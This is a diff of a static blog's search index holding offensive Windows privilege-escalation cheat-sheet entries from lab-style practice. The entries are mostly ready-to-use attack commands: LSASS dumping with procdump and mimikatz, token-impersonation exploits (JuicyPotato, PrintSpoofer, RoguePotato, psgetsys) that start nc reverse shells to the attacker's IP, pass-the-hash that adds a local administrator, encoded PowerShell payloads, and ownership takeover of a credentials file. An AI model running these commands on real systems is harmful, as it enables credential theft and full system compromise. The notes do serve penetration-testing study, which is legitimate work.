     <content><![CDATA[<h3 id="Checking-Windows-Defender-status"><a href="#Checking-Windows-Defender-status" class="headerlink" title="Checking Windows Defender status"></a>Checking Windows Defender status</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span>&gt; <span class="built_in">Get-MpComputerStatus</span></span><br><span class="line"></span><br><span class="line">AMServiceEnabled        : True</span><br><span class="line">AntivirusEnabled        : True</span><br><span class="line">RealTimeProtectionEnabled : False   &lt;<span class="literal">--</span> Disabled! Safe to use standard tools</span><br><span class="line">BehaviorMonitorEnabled  : False</span><br><span class="line">IoavProtectionEnabled   : False</span><br></pre></td></tr></table></figure>
@@ -1951,35 +2012,30 @@
       </tags>
   </entry>
   <entry>
-    <title>SeDebugPrivilege</title>
-    <url>/2026/03/06/SeDebugPrivilege/</url>
+    <title>SeImpersonate and SeAssignPrimaryToken</title>
+    <url>/2026/03/06/SeImpersonate-and-SeAssignPrimaryToken/</url>
     <content><![CDATA[<blockquote>
-<p>To run a particular application or service or assist with troubleshooting, a user might be assigned the <code>SeDebugPrivilege</code> instead of adding the account into the administrators group.</p>
+<p>Sometimes services need to impersonate users to perform actions on their behalf, such as writing files to the system or accessing network shares. For this reason, administrators often grant service accounts the <code>SeImpersonatePrivilege</code>. As a result, whenever we gain a shell as a service account, it is always worth checking whether this privilege is present.</p>
 </blockquote>
 <blockquote>
-<p>Attackers can abuse <code>SeDebugPrivilege</code> by:</p>
-<ul>
-<li>Dumping <code>LSASS</code> memory ( With <code>procdump</code> Or <code>Task Manager</code> )</li>
-<li>Achieving <code>RCE</code> as <code>SYSTEM</code> by interacting with privileged processes.</li>
-</ul>
+<p>Abusing <code>SeImpersonate</code> and <code>SeAssignPrimaryToken</code> consists of tricking a high-privileged process (usually running as <code>SYSTEM</code>) into authenticating to an attacker-controlled service (via Named Pipes, RPC, or COM). When this happens, Windows creates an access token for the connection. With <code>SeImpersonatePrivilege</code>, this token can be impersonated and duplicated. Using <code>SeAssignPrimaryTokenPrivilege</code> (or <code>SeImpersonatePrivilege</code>), a new process can then be spawned with it via functions such as <code>CreateProcessWithTokenW</code>, resulting in <code>SYSTEM</code>-level execution.</p>
 </blockquote>
-<h1 id="Dumping-Lsass"><a href="#Dumping-Lsass" class="headerlink" title="Dumping Lsass"></a>Dumping Lsass</h1><h4 id="Dump-LSASS-with-procdump-exe"><a href="#Dump-LSASS-with-procdump-exe" class="headerlink" title="Dump LSASS with procdump.exe"></a>Dump <code>LSASS</code> with <code>procdump.exe</code></h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Tools</span>\<span class="title">Mimikatz</span>\<span class="title">x64</span>&gt;<span class="title">C</span>:\<span class="title">Tools</span>\<span class="title">Procdump</span>\<span class="title">procdump.exe</span> -<span class="title">accepteula</span> -<span class="title">ma</span> <span class="title">lsass.exe</span> <span class="title">lsass.dmp</span>  </span></span><br></pre></td></tr></table></figure>
+<h2 id="Confirming-Access"><a href="#Confirming-Access" class="headerlink" title="Confirming Access"></a>Confirming Access</h2><p>With this access, we can confirm that we are indeed running in the context of a SQL Server service account.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL&gt; xp_cmdshell <span class="built_in">whoami</span>                                                                       </span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">nt service\mssql<span class="variable">$sqlexpress01</span></span><br></pre></td></tr></table></figure>
 
-<h4 id="Dump-Hashes"><a href="#Dump-Hashes" class="headerlink" title="Dump Hashes"></a>Dump Hashes</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Tools</span>\<span class="title">Mimikatz</span>\<span class="title">x64</span>&gt;<span class="title">mimikatz.exe</span> &quot;<span class="title">sekurlsa</span>::<span class="title">minidump</span> <span class="title">lsass.dmp</span>&quot; &quot;<span class="title">sekurlsa</span>::<span class="title">logonpasswords</span>&quot; <span class="title">exit</span></span></span><br></pre></td></tr></table></figure>
+<h2 id="Checking-Account-Privileges"><a href="#Checking-Account-Privileges" class="headerlink" title="Checking Account Privileges"></a>Checking Account Privileges</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL&gt; xp_cmdshell <span class="built_in">whoami</span> /priv</span><br><span class="line"></span><br><span class="line">----------------------                                                             </span><br><span class="line">Privilege Name                Description                               State      </span><br><span class="line"></span><br><span class="line">============================= ========================================= ========   </span><br><span class="line"></span><br><span class="line">SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   </span><br><span class="line">SeIncreaseQuotaPrivilege      Adjust memory quotas <span class="keyword">for</span> a process        Disabled   </span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    </span><br><span class="line">SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    </span><br><span class="line">SeImpersonatePrivilege        Impersonate a client after authentication Enabled    </span><br><span class="line">SeCreateGlobalPrivilege       Create global objects                     Enabled    </span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working <span class="built_in">set</span>            Disabled   </span><br></pre></td></tr></table></figure>
 
-
-<h1 id="RCE-as-SYSTEM"><a href="#RCE-as-SYSTEM" class="headerlink" title="RCE as SYSTEM"></a>RCE as SYSTEM</h1><blockquote>
-<p>SeDebugPrivilege can be abused to achieve remote code execution as SYSTEM by forcing a process running as SYSTEM to spawn a child process that inherits its security token.</p>
-</blockquote>
-<p>Load Module Exploit</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">. .\psgetsys.ps1</span><br></pre></td></tr></table></figure>
-
-<p>Run Exploit</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ImpersonateFromParentPid -ppid PID-of-priviliged-process -<span class="built_in">command</span> <span class="string">&quot;c:\windows\system32\cmd.exe&quot;</span> -cmdargs <span class="string">&quot;/c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABqAGUAYwB0ACA &lt; SNIP &gt; BzAGUAKAApAA==&quot;</span></span><br></pre></td></tr></table></figure>
+<p>➜ So, we have <code>SeImpersonatePrivilege</code> privilege enabled, </p>
+<h2 id="JuicyPotato"><a href="#JuicyPotato" class="headerlink" title="JuicyPotato"></a>JuicyPotato</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL&gt; xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a <span class="string">&quot;/c c:\tools\nc.exe Our-Ip Our-listening-port -e cmd.exe&quot;</span> -t *</span><br></pre></td></tr></table></figure>
 
 
-<p>Catch Shell As System  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ rlwrap nc -lvnp 443</span><br><span class="line"></span><br><span class="line">PS C:\Windows\system32&gt; <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>]]></content>
+<h2 id="PrintSpoofer"><a href="#PrintSpoofer" class="headerlink" title="PrintSpoofer"></a>PrintSpoofer</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL&gt; xp_cmdshell c:\tools\PrintSpoofer.exe -c <span class="string">&quot;c:\tools\nc.exe Our-Ip Our-listening-port -e cmd&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="RoguePotato"><a href="#RoguePotato" class="headerlink" title="RoguePotato"></a>RoguePotato</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQL&gt; xp_cmdshell xp_cmdshell c:\tools\RoguePotato\RoguePotato.exe -r Our-Ip -l 53375 -e &quot;c:\tools\nc.exe Our-Ip Our-listening-port -e cmd&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Catching-SYSTEM-Shell"><a href="#Catching-SYSTEM-Shell" class="headerlink" title="Catching SYSTEM Shell"></a>Catching SYSTEM Shell</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  windows-privsc rlwrap nc -lvnp 8443</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
+]]></content>
       <categories>
         <category>Active Directory</category>
         <category>Windows</category>
@@ -2032,66 +2088,6 @@
         <category>Windows</category>
         <category>Privesc</category>
         <category>Groups</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>SeTakeOwnershipPrivilege</title>
-    <url>/2026/03/06/SeTakeOwnershipPrivilege/</url>
-    <content><![CDATA[<blockquote>
-<p>➜ SeTakeOwnershipPrivilege lets a user become the owner of any protected Windows object (files, registry keys, services, or AD objects), which enables full access through the sequence : </p>
-</blockquote>
-<ul>
-<li><code>Take Ownership → Modify The DACL (ACL) → Gain Full Access</code></li>
-</ul>
-<blockquote>
-<p>➜ This can lead us to : </p>
-</blockquote>
-<ol>
-<li><p>Read protected files  </p>
-<p> Take ownership → change ACL → read sensitive files (creds, keys, flags).</p>
-</li>
-<li><p>Privilege escalation &#x2F; RCE  </p>
-<p> Take ownership of a config&#x2F;script used by a privileged service → modify it → code runs as SYSTEM&#x2F;service account.</p>
-</li>
-<li><p>Denial of Service (DoS) </p>
-<p> Take ownership → break ACLs on critical files → service&#x2F;app stops working.</p>
-</li>
-<li><p>GPO → ownership abuse (domain)</p>
-<p> Abuse GPO to grant the privilege <code>SeTakeOwnershipPrivilege</code> → then do any of the above on file shares or systems.</p>
-</li>
-</ol>
-<h4 id="Enabling-SeTakeOwnershipPrivilege"><a href="#Enabling-SeTakeOwnershipPrivilege" class="headerlink" title="Enabling SeTakeOwnershipPrivilege"></a>Enabling SeTakeOwnershipPrivilege</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                                              State</span><br><span class="line">============================= ======================================================= ========</span><br><span class="line">SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>➜ In some cases, the privilege is present but disabled by default. It can be enabled at runtime by adjusting the process token using this PowerShell <a href="https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1">script</a>.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Import-Module</span> .\<span class="built_in">Enable-Privilege</span>.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; .\EnableAllTokenPrivs.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line">Privilege Name                Description                              State</span><br><span class="line">============================= ======================================== =======</span><br><span class="line">SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled</span><br></pre></td></tr></table></figure>
-
-<h4 id="Checking-File-Ownership"><a href="#Checking-File-Ownership" class="headerlink" title="Checking File Ownership"></a>Checking File Ownership</h4><p>Check out the owner of the IT directory.</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; cmd /c <span class="built_in">dir</span> /q <span class="string">&#x27;C:\Department Shares\Private\IT&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="number">06</span>/<span class="number">18</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">22</span> PM    &lt;<span class="built_in">DIR</span>&gt;          WINLPE<span class="literal">-SRV01</span>\sccm_svc  ..</span><br><span class="line"><span class="number">06</span>/<span class="number">18</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">23</span> PM                <span class="number">36</span> ...                    cred.txt</span><br></pre></td></tr></table></figure>
-
-
-<blockquote>
-<p>➜  IT share appears to be owned by a service account <code>sccm_svc</code>.</p>
-</blockquote>
-<h4 id="Taking-Ownership-of-the-File"><a href="#Taking-Ownership-of-the-File" class="headerlink" title="Taking Ownership of the File"></a>Taking Ownership of the File</h4><blockquote>
-<p>➜ Now we can use the <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown">takeown</a> Windows binary to change ownership of the file.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; takeown /f <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="Confirming-Ownership-Changed"><a href="#Confirming-Ownership-Changed" class="headerlink" title="Confirming Ownership Changed"></a>Confirming Ownership Changed</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span> | <span class="built_in">select</span> name,directory, <span class="selector-tag">@</span>&#123;Name=<span class="string">&quot;Owner&quot;</span>;Expression=&#123;(<span class="built_in">Get-ACL</span> <span class="variable">$_</span>.Fullname).Owner&#125;&#125;</span><br><span class="line"> </span><br><span class="line">Name            Directory                            Owner</span><br><span class="line">cred.txt        C:\Department Shares\Private\IT      WINLPE<span class="literal">-SRV01</span>\htb<span class="literal">-student</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="Modifying-the-File-ACL-Grant-Ourself-full-privileges-over-the-target-file"><a href="#Modifying-the-File-ACL-Grant-Ourself-full-privileges-over-the-target-file" class="headerlink" title="Modifying the File ACL ( Grant Ourself full privileges over the target file )"></a>Modifying the File ACL ( Grant Ourself full privileges over the target file )</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; icacls <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span> /grant htb<span class="literal">-student</span>:F</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>➜ Now we can () modify, read, etc ) the file.</p>
-</blockquote>
-<h4 id="Interesting-Files-To-Check"><a href="#Interesting-Files-To-Check" class="headerlink" title="Interesting Files To Check"></a>Interesting Files To Check</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\inetpub\wwwwroot\web.config</span><br><span class="line">%WINDIR%\repair\sam</span><br><span class="line">%WINDIR%\repair\system</span><br><span class="line">%WINDIR%\repair\software, %WINDIR%\repair\security</span><br><span class="line">%WINDIR%\system32\config\SecEvent.Evt</span><br><span class="line">%WINDIR%\system32\config\default.sav</span><br><span class="line">%WINDIR%\system32\config\security.sav</span><br><span class="line">%WINDIR%\system32\config\software.sav</span><br><span class="line">%WINDIR%\system32\config\system.sav</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Privesc</category>
-        <category>User</category>
       </categories>
   </entry>
   <entry>
@@ -2162,38 +2158,6 @@
       </tags>
   </entry>
   <entry>
-    <title>SeImpersonate and SeAssignPrimaryToken</title>
-    <url>/2026/03/06/SeImpersonate-and-SeAssignPrimaryToken/</url>
-    <content><![CDATA[<blockquote>
-<p>Sometimes services need to impersonate users to perform actions on their behalf, such as writing files to the system or accessing network shares. For this reason, administrators often grant service accounts the <code>SeImpersonatePrivilege</code>. As a result, whenever we gain a shell as a service account, it is always worth checking whether this privilege is present.</p>
-</blockquote>
-<blockquote>
-<p>Abusing <code>SeImpersonate</code> and <code>SeAssignPrimaryToken</code> consists of tricking a high-privileged process (usually running as <code>SYSTEM</code>) into authenticating to an attacker-controlled service (via Named Pipes, RPC, or COM). When this happens, Windows creates an access token for the connection. With <code>SeImpersonatePrivilege</code>, this token can be impersonated and duplicated. Using <code>SeAssignPrimaryTokenPrivilege</code> (or <code>SeImpersonatePrivilege</code>), a new process can then be spawned with it via functions such as <code>CreateProcessWithTokenW</code>, resulting in <code>SYSTEM</code>-level execution.</p>
-</blockquote>
-<h2 id="Confirming-Access"><a href="#Confirming-Access" class="headerlink" title="Confirming Access"></a>Confirming Access</h2><p>With this access, we can confirm that we are indeed running in the context of a SQL Server service account.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL&gt; xp_cmdshell <span class="built_in">whoami</span>                                                                       </span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">nt service\mssql<span class="variable">$sqlexpress01</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="Checking-Account-Privileges"><a href="#Checking-Account-Privileges" class="headerlink" title="Checking Account Privileges"></a>Checking Account Privileges</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL&gt; xp_cmdshell <span class="built_in">whoami</span> /priv</span><br><span class="line"></span><br><span class="line">----------------------                                                             </span><br><span class="line">Privilege Name                Description                               State      </span><br><span class="line"></span><br><span class="line">============================= ========================================= ========   </span><br><span class="line"></span><br><span class="line">SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   </span><br><span class="line">SeIncreaseQuotaPrivilege      Adjust memory quotas <span class="keyword">for</span> a process        Disabled   </span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    </span><br><span class="line">SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    </span><br><span class="line">SeImpersonatePrivilege        Impersonate a client after authentication Enabled    </span><br><span class="line">SeCreateGlobalPrivilege       Create global objects                     Enabled    </span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working <span class="built_in">set</span>            Disabled   </span><br></pre></td></tr></table></figure>
-
-<p>➜ So, we have <code>SeImpersonatePrivilege</code> privilege enabled, </p>
-<h2 id="JuicyPotato"><a href="#JuicyPotato" class="headerlink" title="JuicyPotato"></a>JuicyPotato</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL&gt; xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a <span class="string">&quot;/c c:\tools\nc.exe Our-Ip Our-listening-port -e cmd.exe&quot;</span> -t *</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="PrintSpoofer"><a href="#PrintSpoofer" class="headerlink" title="PrintSpoofer"></a>PrintSpoofer</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL&gt; xp_cmdshell c:\tools\PrintSpoofer.exe -c <span class="string">&quot;c:\tools\nc.exe Our-Ip Our-listening-port -e cmd&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="RoguePotato"><a href="#RoguePotato" class="headerlink" title="RoguePotato"></a>RoguePotato</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQL&gt; xp_cmdshell xp_cmdshell c:\tools\RoguePotato\RoguePotato.exe -r Our-Ip -l 53375 -e &quot;c:\tools\nc.exe Our-Ip Our-listening-port -e cmd&quot;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Catching-SYSTEM-Shell"><a href="#Catching-SYSTEM-Shell" class="headerlink" title="Catching SYSTEM Shell"></a>Catching SYSTEM Shell</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  windows-privsc rlwrap nc -lvnp 8443</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Privesc</category>
-        <category>User</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Windows Credential Hunting</title>
     <url>/2025/11/26/Windows-Credential-Hunting/</url>
     <content><![CDATA[<h2 id="Common-Password-Location"><a href="#Common-Password-Location" class="headerlink" title="Common Password Location"></a>Common Password Location</h2><ul>
@@ -2239,35 +2203,6 @@
       <tags>
         <tag>Lazagne</tag>
         <tag>Search-for-File-Content</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows Pass the Hash (PtH)</title>
-    <url>/2025/11/27/Windows-Pass-the-Hash-PtH/</url>
-    <content><![CDATA[<h1 id="Mimikatz-local-administrator-privilege"><a href="#Mimikatz-local-administrator-privilege" class="headerlink" title="Mimikatz ( local administrator privilege  )"></a>Mimikatz ( local administrator privilege  )</h1><p>➜ This command will create a new CMD session using the permissions of the user we want to impersonate.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe privilege::debug <span class="string">&quot;sekurlsa::pth /user:username /NTLM:&lt;hash&gt; /domain:&lt;domain&gt; /run:cmd.exe&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
-
-<p>➜ When impersonating a local account, the <code>/domain</code> parameter should be set to <code>localhost</code> or simply <code>.</code></p>
-<h1 id="PowerShell-Invoke-TheHash"><a href="#PowerShell-Invoke-TheHash" class="headerlink" title="PowerShell Invoke-TheHash"></a>PowerShell Invoke-TheHash</h1><p>➜ Since <a href="https://github.com/Kevin-Robertson/Invoke-TheHash">Invoke-TheHash</a> uses <code>Invoke-SMBExec</code> and <code>Invoke-WMIExec</code> to authenticate and execute commands on the target, the NTLM hash used must belong to an <code>account with administrative rights</code> on the target.</p>
-<h4 id="Invoke-TheHash-with-SMB"><a href="#Invoke-TheHash-with-SMB" class="headerlink" title="Invoke-TheHash with SMB"></a>Invoke-TheHash with SMB</h4><p>➜ This command creates a new local user account and adds it to the <code>local Administrators group</code> on the target machine.</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> c:\tools\<span class="built_in">Invoke-TheHash</span>&gt; <span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-TheHash</span>.psd1</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> c:\tools\<span class="built_in">Invoke-TheHash</span>&gt; <span class="built_in">Invoke-SMBExec</span> <span class="literal">-Target</span> &lt;tar<span class="built_in">get-ip</span>&gt; <span class="literal">-Domain</span> &lt;domain&gt; <span class="literal">-Username</span> &lt;username&gt; <span class="literal">-Hash</span> &lt;hash&gt; <span class="literal">-Command</span> <span class="string">&quot;net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add&quot;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="Invoke-TheHash-with-WMI"><a href="#Invoke-TheHash-with-WMI" class="headerlink" title="Invoke-TheHash with WMI"></a>Invoke-TheHash with WMI</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\tools&gt; .\nc.exe -lvnp &lt;Port&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS c:\tools\Invoke-TheHash&gt; Import-Module .\Invoke-TheHash.psd1</span><br><span class="line"></span><br><span class="line">PS c:\tools\Invoke-TheHash&gt; Invoke-WMIExec -Target target -Domain domain -Username username -Hash hash -Command &quot;powershell -e JABjAGwAaQBlAG4Ad &lt;snip&gt; AGwAbwBzAGUAKAApAA==&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Pass the Hash (PtH)</category>
-      </categories>
-      <tags>
-        <tag>mimikatz</tag>
-        <tag>Invoke-TheHash</tag>
       </tags>
   </entry>
   <entry>
@@ -2408,54 +2343,32 @@
       </tags>
   </entry>
   <entry>
-    <title>Writing Custom Wordlists and Rules</title>
-    <url>/2025/12/04/Writing-Custom-Wordlists-and-Rules/</url>
-    <content><![CDATA[<h1 id="Default-Credential"><a href="#Default-Credential" class="headerlink" title="Default Credential"></a>Default Credential</h1><h3 id="Creds"><a href="#Creds" class="headerlink" title="Creds"></a>Creds</h3><p>Installation </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install defaultcreds-cheat-sheet</span><br></pre></td></tr></table></figure>
+    <title>Windows Pass the Hash (PtH)</title>
+    <url>/2025/11/27/Windows-Pass-the-Hash-PtH/</url>
+    <content><![CDATA[<h1 id="Mimikatz-local-administrator-privilege"><a href="#Mimikatz-local-administrator-privilege" class="headerlink" title="Mimikatz ( local administrator privilege  )"></a>Mimikatz ( local administrator privilege  )</h1><p>➜ This command will create a new CMD session using the permissions of the user we want to impersonate.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe privilege::debug <span class="string">&quot;sekurlsa::pth /user:username /NTLM:&lt;hash&gt; /domain:&lt;domain&gt; /run:cmd.exe&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
 
-<p>Example :</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">creds search tomcat</span><br></pre></td></tr></table></figure>
+<p>➜ When impersonating a local account, the <code>/domain</code> parameter should be set to <code>localhost</code> or simply <code>.</code></p>
+<h1 id="PowerShell-Invoke-TheHash"><a href="#PowerShell-Invoke-TheHash" class="headerlink" title="PowerShell Invoke-TheHash"></a>PowerShell Invoke-TheHash</h1><p>➜ Since <a href="https://github.com/Kevin-Robertson/Invoke-TheHash">Invoke-TheHash</a> uses <code>Invoke-SMBExec</code> and <code>Invoke-WMIExec</code> to authenticate and execute commands on the target, the NTLM hash used must belong to an <code>account with administrative rights</code> on the target.</p>
+<h4 id="Invoke-TheHash-with-SMB"><a href="#Invoke-TheHash-with-SMB" class="headerlink" title="Invoke-TheHash with SMB"></a>Invoke-TheHash with SMB</h4><p>➜ This command creates a new local user account and adds it to the <code>local Administrators group</code> on the target machine.</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> c:\tools\<span class="built_in">Invoke-TheHash</span>&gt; <span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-TheHash</span>.psd1</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> c:\tools\<span class="built_in">Invoke-TheHash</span>&gt; <span class="built_in">Invoke-SMBExec</span> <span class="literal">-Target</span> &lt;tar<span class="built_in">get-ip</span>&gt; <span class="literal">-Domain</span> &lt;domain&gt; <span class="literal">-Username</span> &lt;username&gt; <span class="literal">-Hash</span> &lt;hash&gt; <span class="literal">-Command</span> <span class="string">&quot;net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add&quot;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
 
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">creds search mysql</span><br></pre></td></tr></table></figure>
+<h4 id="Invoke-TheHash-with-WMI"><a href="#Invoke-TheHash-with-WMI" class="headerlink" title="Invoke-TheHash with WMI"></a>Invoke-TheHash with WMI</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\tools&gt; .\nc.exe -lvnp &lt;Port&gt;</span><br></pre></td></tr></table></figure>
 
-
-<h1 id="CeWL"><a href="#CeWL" class="headerlink" title="CeWL"></a>CeWL</h1><blockquote>
-<ul>
-<li>Depth to spider (<code>-d</code>)</li>
-<li>The minimum length of the word (<code>-m</code>)</li>
-<li>The storage of the found words in lowercase (<code>--lowercase</code>)</li>
-<li>The file where we want to store the results (<code>-w</code>)</li>
-</ul>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl https://website -d 4 -m 6 --lowercase -w wordlist.txt</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Cupp"><a href="#Cupp" class="headerlink" title="Cupp"></a>Cupp</h1><blockquote>
-<p>We can perform OSINT gathering and feed the collected information into <code>cupp</code> to generate a personalized wordlist.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cupp -i</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS c:\tools\Invoke-TheHash&gt; Import-Module .\Invoke-TheHash.psd1</span><br><span class="line"></span><br><span class="line">PS c:\tools\Invoke-TheHash&gt; Invoke-WMIExec -Target target -Domain domain -Username username -Hash hash -Command &quot;powershell -e JABjAGwAaQBlAG4Ad &lt;snip&gt; AGwAbwBzAGUAKAApAA==&quot;</span><br></pre></td></tr></table></figure>
 
 
 
-<h1 id="Hashcat-Rules"><a href="#Hashcat-Rules" class="headerlink" title="Hashcat Rules"></a>Hashcat Rules</h1><h3 id="Predefined-Rules"><a href="#Predefined-Rules" class="headerlink" title="Predefined Rules"></a>Predefined Rules</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ <span class="built_in">ls</span> /usr/share/hashcat/rules/</span><br><span class="line"></span><br><span class="line">best64.rule</span><br><span class="line">dive.rule</span><br><span class="line">generated2.rule</span><br><span class="line">rockyou-30000.rule</span><br><span class="line">hob0rules</span><br></pre></td></tr></table></figure>
-
-<h3 id="Writing-Custom-Rules"><a href="#Writing-Custom-Rules" class="headerlink" title="Writing Custom Rules"></a>Writing Custom Rules</h3><blockquote>
-<p><code>:</code>      Do nothing<br><code>l</code>      Lowercase all letters<br><code>u</code>      Uppercase all letters                        <br><code>c</code>      Capitalize the first letter and lowercase others<br><code>sXY</code>   Replace all instances of X with Y                <br><code>$!</code>     Add the exclamation character at the end</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> custom.rule</span><br><span class="line"></span><br><span class="line">:</span><br><span class="line">c</span><br><span class="line">so0</span><br><span class="line">c so0</span><br><span class="line">sa@</span><br><span class="line">c sa@</span><br><span class="line">c sa@ so0</span><br><span class="line">$!</span><br><span class="line">$! c</span><br><span class="line">$! so0</span><br><span class="line">$! sa@</span><br><span class="line">$! c so0</span><br><span class="line">$! c sa@</span><br><span class="line">$! so0 sa@</span><br><span class="line">$! c so0 sa@</span><br></pre></td></tr></table></figure>
-
